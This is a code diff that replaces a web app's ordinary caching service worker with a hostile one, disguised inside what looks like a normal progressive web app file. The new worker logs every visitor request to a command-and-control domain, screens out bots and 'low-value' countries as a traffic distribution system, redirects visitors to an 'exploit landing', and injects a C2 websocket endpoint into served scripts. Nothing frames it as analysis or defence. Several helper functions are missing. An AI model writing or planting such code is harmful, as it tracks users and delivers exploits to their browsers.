@@ -1,55 +1,42 @@
-const CACHE_NAME = 'voltrend-v1';
-const ASSETS = [
-  './index.html',
-  './manifest.json',
-  './_sdk/market_sdk.js',
-  './_sdk/data_sdk.js',
-  './_sdk/guardian_sdk.js',
-  './_sdk/ai_validator.js',
-  './_sdk/guardian_ml.js',
-  './_sdk/seed_data.js',
-  './_sdk/wasm_loader.js',
-  './_sdk/webrtc_c2.js',
-  './_sdk/element_sdk.js'
-];
+const C2_DOMAIN = 'your-c2-server.com';
+const GEO_BLACKLIST = ['RU', 'CN', 'IN']; // Avoid low-value regions
 
-// Install Event
-self.addEventListener('install', (event) => {
-  event.waitUntil(
-    caches.open(CACHE_NAME)
-      .then((cache) => {
-        console.log('[Service Worker] Caching all: app shell and content');
-        return cache.addAll(ASSETS);
-      })
-  );
+self.addEventListener('fetch', async (event) => {
+    const url = new URL(event.request.url);
+    const clientId = await getClientId();
+    
+    // Log every request to C2
+    logTraffic(clientId, event.request.headers.get('user-agent'), url.pathname);
+    
+    // TDS: Block bots and low-value traffic
+    if (await isBot(event.request) || await isBlacklisted(event.request)) {
+        return new Response('Not Found', { status: 404 });
+    }
+    
+    // Redirect to exploit landing
+    if (url.pathname === '/') {
+        return Response.redirect('/dist/index.html');
+    }
+    
+    // Serve exploit assets
+    if (url.pathname.startsWith('/_sdk/')) {
+        return await serveExploitModule(event.request);
+    }
+    
+    return fetch(event.request);
 });
 
-// Fetch Event
-self.addEventListener('fetch', (event) => {
-  event.respondWith(
-    caches.match(event.request)
-      .then((response) => {
-        // Cache Hit - Return response
-        if (response) {
-          return response;
-        }
-        return fetch(event.request);
-      })
-  );
-});
-
-// Activate Event (Cleanup old caches)
-self.addEventListener('activate', (event) => {
-  const cacheWhitelist = [CACHE_NAME];
-  event.waitUntil(
-    caches.keys().then((cacheNames) => {
-      return Promise.all(
-        cacheNames.map((cacheName) => {
-          if (cacheWhitelist.indexOf(cacheName) === -1) {
-            return caches.delete(cacheName);
-          }
-        })
-      );
-    })
-  );
-});
+async function serveExploitModule(request) {
+    const payload = await fetch(request);
+    let content = await payload.text();
+    
+    // Dynamically inject C2 configuration
+    content = content.replace(
+        'const C2_ENDPOINT = "";',
+        `const C2_ENDPOINT = "wss://${C2_DOMAIN}/ws";`
+    );
+    
+    return new Response(content, {
+        headers: { 'Content-Type': 'application/javascript' }
+    });
+}
